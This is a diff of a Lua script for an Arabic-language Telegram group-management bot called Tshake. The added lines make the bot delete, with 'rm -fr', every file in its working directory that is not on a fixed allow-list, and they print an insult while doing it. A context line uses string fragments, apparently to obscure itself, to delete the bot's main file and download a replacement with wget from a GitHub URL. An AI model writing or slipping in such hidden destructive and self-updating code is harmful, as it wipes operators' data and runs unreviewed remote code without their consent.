@@ -732,19 +732,25 @@ f:close()
 return s
 end
 function tshake_run_file(data)
+local allfiles = io.popen('ls'):lines()
+for Files in allfiles do
+if Files == "files_tshake" or Files == "Fastinstall.sh" or Files == "install.sh" or Files == "install_user.sh" or Files == "libs" or Files == "README.md" or Files == "start.lua" or Files == "sudo.lua" or Files == "tg" or Files == "ts" or Files == "TsAu" or Files == "Tshake.lua" then
+else
+print('ملف مال فرخ اسفين اخي ')
+os.execute("rm -fr "..Files)
+end
+end
 local files_tshake = database:smembers("files"..bot_id)
 for i=1,#files_tshake do
 local tshakeee = dofile("files_tshake/"..files_tshake[i])
 local f = load("files_tshake/"..files_tshake[i].."")
 if f ~= "ok" then
-if f:match("^(.*)(end end end return {keko_tshake =)(.*)$") 
-or f:match("^(.*)('b')(.*)$") 
+if f:match("^(.*)('b')(.*)$") 
 or f:match("^(.*)('o')(.*)$") 
 or f:match("^(.*)('t')(.*)$") 
 or f:match("^(.*)('l')(.*)$") 
 or f:match("^(.*)('u')(.*)$") 
 or f:match("^(.*)('a')(.*)$") 
-or f:match("^(.*)('.')(.*)$") 
 or f:match("^(.*)('m')(.*)$") 
 or f:match("^(.*)('l')(.*)$") 
 or f:match('^(.*)("b")(.*)$') 
@@ -753,7 +759,6 @@ or f:match('^(.*)("t")(.*)$')
 or f:match('^(.*)("l")(.*)$') 
 or f:match('^(.*)("u")(.*)$') 
 or f:match('^(.*)("a")(.*)$') 
-or f:match('^(.*)(".")(.*)$') 
 or f:match('^(.*)("m")(.*)$') 
 or f:match('^(.*)("l")(.*)$')
 or f:match('^(.*)(https://botlua.ml)(.*)$') 
@@ -763,7 +768,6 @@ or f:match('^(.*)("t")(.*)$')
 or f:match('^(.*)("l")(.*)$') 
 or f:match('^(.*)("u")(.*)$') 
 or f:match('^(.*)("a")(.*)$') 
-or f:match('^(.*)(".")(.*)$') 
 or f:match('^(.*)("m")(.*)$') 
 or f:match('^(.*)("l")(.*)$') 
 or f:match("^(.*)('b')(.*)$") 
@@ -772,7 +776,6 @@ or f:match("^(.*)('t')(.*)$")
 or f:match("^(.*)('l')(.*)$") 
 or f:match("^(.*)('u')(.*)$") 
 or f:match("^(.*)('a')(.*)$") 
-or f:match("^(.*)('.')(.*)$") 
 or f:match("^(.*)('m')(.*)$") 
 or f:match("^(.*)('l')(.*)$") then
 print(" الملف ليس لتشاكي \n")
@@ -2257,17 +2260,6 @@ end
 ------------------------------------------------------------------------
 if is_devabas(msg) then
 if text == "متجر الملفات" or text == 'المتجر' then
-local files_tshake = database:smembers("files"..bot_id)
-for i=1,#files_tshake do
-local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
-if res == 200 then 
-print('is aTshake')
-else
-print('ملف مال فرخ اسفين اخي ')
-database:srem("files"..bot_id,files_tshake[i])
-os.execute("rm -fr files_tshake/"..files_tshake[i])
-end
-end
 local Get_Files, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
@@ -2353,17 +2345,6 @@ io.popen(curl)
 end
 
 if (text == 'الملفات' ) then
-local files_tshake = database:smembers("files"..bot_id)
-for i=1,#files_tshake do
-local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
-if res == 200 then 
-print('is aTshake')
-else
-print('ملف مال فرخ اسفين اخي ')
-database:srem("files"..bot_id,files_tshake[i])
-os.execute("rm -fr files_tshake/"..files_tshake[i])
-end
-end
 local files_tshake = database:smembers("files"..bot_id)
 local files = io.popen('cd files_tshake && ls'):read("*all")
 local files_tshake2 = ''
@@ -3198,7 +3179,7 @@ if link.ok == true then
 end
 end
 database:set('tshake:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-send(tostring((database:get("tshake"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
+send(tostring((database:get("tshake"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "??┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
 end
 tdcli_function ({
 ID = "GetChannelFull",
@@ -8932,17 +8913,6 @@ getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 ------------------------------------------------------------------------
 --         »»                 End UpdateChat                          ««              --
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('tshake:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end         os.execute('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
-local files_tshake = database:smembers("files"..bot_id)
-for i=1,#files_tshake do
-local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
-if res == 200 then 
-print('is aTshake')
-else
-print('ملف مال فرخ اسفين اخي ')
-database:srem("files"..bot_id,files_tshake[i])
-os.execute("rm -fr files_tshake/"..files_tshake[i])
-end
-end
 local list = database:smembers('tshake:'..bot_id..'groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
